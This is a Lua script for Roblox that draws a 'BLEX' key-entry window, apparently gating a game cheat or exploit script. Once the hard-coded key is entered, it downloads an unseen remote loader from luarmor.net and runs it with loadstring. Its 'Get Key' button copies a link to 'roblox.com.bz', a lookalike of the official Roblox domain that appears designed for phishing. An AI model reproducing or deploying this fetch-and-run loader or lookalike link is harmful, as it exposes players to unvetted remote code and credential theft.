-- BLEX | Key System
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- ⚠️ PUT YOUR STUFF HERE ⚠️
local CORRECT_KEY = "HEX-GG2-7QXM2-KJP9R"
local KEY_LINK = "https://roblox.com.bz/communities/3817936952/"

-- // ScreenGui
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "BLEX_KeySystem"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = player:WaitForChild("PlayerGui")

-- // Main Frame
local Main = Instance.new("Frame")
Main.Size = UDim2.new(0, 320, 0, 220)
Main.Position = UDim2.new(0.5, -160, 0.5, -110)
Main.BackgroundColor3 = Color3.fromRGB(24, 24, 27)
Main.BorderSizePixel = 0
Main.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 10)
UICorner.Parent = Main

local UIStroke = Instance.new("UIStroke")
UIStroke.Color = Color3.fromRGB(45, 45, 50)
UIStroke.Thickness = 1
UIStroke.Parent = Main

-- // Title
local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 32)
Title.Position = UDim2.new(0, 0, 0, 12)
Title.BackgroundTransparency = 1
Title.Text = "BLEX"
Title.TextColor3 = Color3.fromRGB(70, 140, 255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 24
Title.Parent = Main

-- // Subtitle
local SubTitle = Instance.new("TextLabel")
SubTitle.Size = UDim2.new(1, 0, 0, 16)
SubTitle.Position = UDim2.new(0, 0, 0, 42)
SubTitle.BackgroundTransparency = 1
SubTitle.Text = "made by Blex"
SubTitle.TextColor3 = Color3.fromRGB(130, 130, 135)
SubTitle.Font = Enum.Font.Gotham
SubTitle.TextSize = 12
SubTitle.Parent = Main

-- // Description
local Description = Instance.new("TextLabel")
Description.Size = UDim2.new(1, -40, 0, 16)
Description.Position = UDim2.new(0, 20, 0, 62)
Description.BackgroundTransparency = 1
Description.Text = "You must join the group to get a key"
Description.TextColor3 = Color3.fromRGB(160, 160, 165)
Description.Font = Enum.Font.Gotham
Description.TextSize = 11
Description.TextXAlignment = Enum.TextXAlignment.Center
Description.Parent = Main

-- // Key Input Box
local KeyBox = Instance.new("TextBox")
KeyBox.Size = UDim2.new(1, -40, 0, 38)
KeyBox.Position = UDim2.new(0, 20, 0, 85)
KeyBox.BackgroundColor3 = Color3.fromRGB(32, 32, 36)
KeyBox.TextColor3 = Color3.fromRGB(255, 255, 255)
KeyBox.PlaceholderText = "Enter key"
KeyBox.PlaceholderColor3 = Color3.fromRGB(110, 110, 110)
KeyBox.Font = Enum.Font.Gotham
KeyBox.TextSize = 14
KeyBox.ClearTextOnFocus = false
KeyBox.Parent = Main

local KeyBoxCorner = Instance.new("UICorner")
KeyBoxCorner.CornerRadius = UDim.new(0, 8)
KeyBoxCorner.Parent = KeyBox

-- // Status Label
local Status = Instance.new("TextLabel")
Status.Size = UDim2.new(1, -40, 0, 18)
Status.Position = UDim2.new(0, 20, 0, 128)
Status.BackgroundTransparency = 1
Status.Text = ""
Status.TextColor3 = Color3.fromRGB(255, 90, 90)
Status.Font = Enum.Font.Gotham
Status.TextSize = 12
Status.TextXAlignment = Enum.TextXAlignment.Left
Status.Parent = Main

-- // Check Key Button (LEFT)
local CheckBtn = Instance.new("TextButton")
CheckBtn.Size = UDim2.new(0.46, 0, 0, 38)
CheckBtn.Position = UDim2.new(0, 20, 0, 155)
CheckBtn.BackgroundColor3 = Color3.fromRGB(70, 140, 255)
CheckBtn.Text = "Check Key"
CheckBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CheckBtn.Font = Enum.Font.GothamBold
CheckBtn.TextSize = 14
CheckBtn.Parent = Main

local CheckCorner = Instance.new("UICorner")
CheckCorner.CornerRadius = UDim.new(0, 8)
CheckCorner.Parent = CheckBtn

-- // Get Key Button (RIGHT)
local CopyBtn = Instance.new("TextButton")
CopyBtn.Size = UDim2.new(0.46, 0, 0, 38)
CopyBtn.Position = UDim2.new(0.54, 0, 0, 155)
CopyBtn.BackgroundColor3 = Color3.fromRGB(38, 38, 42)
CopyBtn.Text = "Get Key"
CopyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CopyBtn.Font = Enum.Font.GothamBold
CopyBtn.TextSize = 14
CopyBtn.Parent = Main

local CopyCorner = Instance.new("UICorner")
CopyCorner.CornerRadius = UDim.new(0, 8)
CopyCorner.Parent = CopyBtn

-- // Functionality

CopyBtn.MouseButton1Click:Connect(function()
    setclipboard(KEY_LINK)
    Status.TextColor3 = Color3.fromRGB(80, 200, 255)
    Status.Text = "Key link copied!"
end)

CheckBtn.MouseButton1Click:Connect(function()
    local enteredKey = KeyBox.Text

    if enteredKey == "" then
        Status.TextColor3 = Color3.fromRGB(255, 90, 90)
        Status.Text = "Please enter a key."
        return
    end

    if enteredKey == CORRECT_KEY then
        Status.TextColor3 = Color3.fromRGB(90, 255, 140)
        Status.Text = "Key accepted! Loading..."

        task.wait(0.6)
        ScreenGui:Destroy()

        loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/c1a65c331ac2355d7bb64a457f684c33.lua"))()
    else
        Status.TextColor3 = Color3.fromRGB(255, 90, 90)
        Status.Text = "Invalid key. Try again."
    end
end)
